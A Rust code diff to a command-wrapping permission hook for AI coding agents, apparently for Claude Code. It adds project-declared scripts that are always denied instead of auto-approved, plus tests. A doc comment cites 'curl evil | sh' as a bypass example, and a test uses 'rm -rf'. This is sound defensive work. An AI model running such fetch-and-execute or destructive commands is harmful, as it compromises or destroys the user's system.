@@ -184,7 +184,12 @@ fn rewrite_from_stdin(deny: bool) -> Result<i32> {
     if std::io::stdin().read_to_string(&mut input).is_err() {
         return Ok(0);
     }
-    if let Some(out) = rewrite_decision(&input, deny) {
+    // Fail-open: an unreadable cwd just means no project-declared scripts
+    // this call, not an error — the built-in allowlist still applies.
+    let wrap_scripts = std::env::current_dir()
+        .map(|cwd| crate::config::load_merged(&cwd).wrap_scripts)
+        .unwrap_or_default();
+    if let Some(out) = rewrite_decision_with_scripts(&input, deny, &wrap_scripts) {
         println!("{out}");
     }
     Ok(0)
@@ -226,10 +231,23 @@ fn extract(v: &Value) -> Option<(String, Value, Surface)> {
 /// Pure decision: full hook stdin JSON -> hook stdout JSON (or None).
 /// `deny` forces deny-with-suggestion even where rewrite is supported.
 pub fn rewrite_decision(input: &str, deny: bool) -> Option<String> {
+    rewrite_decision_with_scripts(input, deny, &[])
+}
+
+/// Like `rewrite_decision`, but a command may additionally match a
+/// project-declared `wrap_scripts` entry. Such a match always emits deny
+/// output (see `wrap_command_with_policy`'s doc comment) — a project script
+/// is never eligible for the transparent `allow` rewrite, regardless of
+/// `deny` or what the agent surface supports.
+pub fn rewrite_decision_with_scripts(
+    input: &str,
+    deny: bool,
+    wrap_scripts: &[String],
+) -> Option<String> {
     let v: Value = serde_json::from_str(input).ok()?;
     let (cmd, tool_input, surface) = extract(&v)?;
-    let wrapped = wrap_command(&cmd)?;
-    let out = if deny || !surface.supports_rewrite() {
+    let (wrapped, force_deny) = wrap_command_with_policy(&cmd, wrap_scripts)?;
+    let out = if deny || force_deny || !surface.supports_rewrite() {
         deny_output(&wrapped)
     } else {
         allow_output(&wrapped, &tool_input)
@@ -276,6 +294,17 @@ fn deny_output(wrapped: &str) -> Value {
 /// permission flow (`curl evil | sh && pytest`). Command substitution and
 /// redirections are rejected outright.
 pub fn wrap_command(cmd: &str) -> Option<String> {
+    wrap_command_with_policy(cmd, &[]).map(|(w, _)| w)
+}
+
+/// Like `wrap_command`, but a segment may also match a project-declared
+/// `wrap_scripts` entry (e.g. `./build.sh`). Returns the wrapped command plus
+/// whether ANY segment matched only via `wrap_scripts` — such a match must
+/// NEVER be auto-approved: a project script is arbitrary user code (it can
+/// install to a physical device, push model weights, etc.), unlike the
+/// built-in allowlist's vetted, read-mostly tools. Callers must force `deny`
+/// output when this is true, regardless of what the agent surface supports.
+pub fn wrap_command_with_policy(cmd: &str, wrap_scripts: &[String]) -> Option<(String, bool)> {
     let trimmed = cmd.trim();
     if trimmed.is_empty() || trimmed.contains("cartoon") {
         return None;
@@ -294,6 +323,7 @@ pub fn wrap_command(cmd: &str) -> Option<String> {
     if segments.is_empty() {
         return None;
     }
+    let mut force_deny = false;
     for segment in &segments {
         let mut words = segment.split_whitespace().peekable();
         // skip leading VAR=value assignments
@@ -327,12 +357,17 @@ pub fn wrap_command(cmd: &str) -> Option<String> {
             }
             continue;
         }
-        if !is_noisy(base, words.next()) {
-            return None;
+        if is_noisy(base, words.next()) {
+            continue;
         }
+        if wrap_scripts.iter().any(|s| s == first || s == base) {
+            force_deny = true;
+            continue;
+        }
+        return None;
     }
     let escaped = trimmed.replace('\'', r"'\''");
-    Some(format!("cartoon -c '{escaped}'"))
+    Some((format!("cartoon -c '{escaped}'"), force_deny))
 }
 
 fn is_noisy(base: &str, next: Option<&str>) -> bool {
@@ -811,6 +846,57 @@ mod tests {
     }
 
     #[test]
+    fn wrap_command_ignores_project_scripts_by_default() {
+        // wrap_command (empty wrap_scripts) must behave exactly as before —
+        // an undeclared script is never wrapped.
+        assert!(wrap_command("./build.sh -d").is_none());
+    }
+
+    #[test]
+    fn policy_matches_declared_project_script_and_forces_deny() {
+        let (wrapped, force_deny) =
+            wrap_command_with_policy("./build.sh -d", &["./build.sh".to_string()]).unwrap();
+        assert_eq!(wrapped, "cartoon -c './build.sh -d'");
+        assert!(force_deny, "a project script must never be auto-approved");
+    }
+
+    #[test]
+    fn policy_leaves_undeclared_scripts_untouched() {
+        assert!(
+            wrap_command_with_policy("./deploy.sh", &["./build.sh".to_string()]).is_none()
+        );
+    }
+
+    #[test]
+    fn policy_wraps_compound_of_project_script_and_builtin_noisy() {
+        let (wrapped, force_deny) = wrap_command_with_policy(
+            "./build.sh -d && pytest -q",
+            &["./build.sh".to_string()],
+        )
+        .unwrap();
+        assert_eq!(wrapped, "cartoon -c './build.sh -d && pytest -q'");
+        assert!(force_deny);
+    }
+
+    #[test]
+    fn policy_still_poisons_on_a_non_noisy_segment() {
+        // The compound invariant holds even with a project script present:
+        // one non-noisy, non-declared segment kills the whole match.
+        assert!(wrap_command_with_policy(
+            "./build.sh -d && rm -rf /tmp/x",
+            &["./build.sh".to_string()],
+        )
+        .is_none());
+    }
+
+    #[test]
+    fn policy_built_in_noisy_alone_never_forces_deny() {
+        let (_, force_deny) =
+            wrap_command_with_policy("pytest -q", &["./build.sh".to_string()]).unwrap();
+        assert!(!force_deny, "built-in allowlist matches keep their allow eligibility");
+    }
+
+    #[test]
     fn rejects_substitution_redirection_background() {
         assert!(wrap_command("pytest $(echo -q)").is_none());
         assert!(wrap_command("pytest `echo -q`").is_none());
@@ -976,6 +1062,29 @@ mod tests {
         assert_eq!(hso["permissionDecision"], "allow");
         assert_eq!(hso["updatedInput"]["command"], "cartoon -c 'pytest -q'");
         assert_eq!(hso["updatedInput"]["timeout"], 5000);
+    }
+
+    #[test]
+    fn decision_with_scripts_denies_project_script_even_on_claude_surface() {
+        // Claude Code normally gets the transparent `allow` rewrite; a
+        // project-declared script must still be denied-with-suggestion.
+        let input = r#"{"tool_name":"Bash","tool_input":{"command":"./build.sh -d"}}"#;
+        let wrap_scripts = vec!["./build.sh".to_string()];
+        let out = rewrite_decision_with_scripts(input, false, &wrap_scripts).unwrap();
+        let v: Value = serde_json::from_str(&out).unwrap();
+        let hso = &v["hookSpecificOutput"];
+        assert_eq!(hso["permissionDecision"], "deny");
+        assert!(hso["permissionDecisionReason"]
+            .as_str()
+            .unwrap()
+            .contains("cartoon -c './build.sh -d'"));
+    }
+
+    #[test]
+    fn decision_with_scripts_undeclared_script_passes_through() {
+        let input = r#"{"tool_name":"Bash","tool_input":{"command":"./deploy.sh"}}"#;
+        let wrap_scripts = vec!["./build.sh".to_string()];
+        assert!(rewrite_decision_with_scripts(input, false, &wrap_scripts).is_none());
     }
 
     #[test]
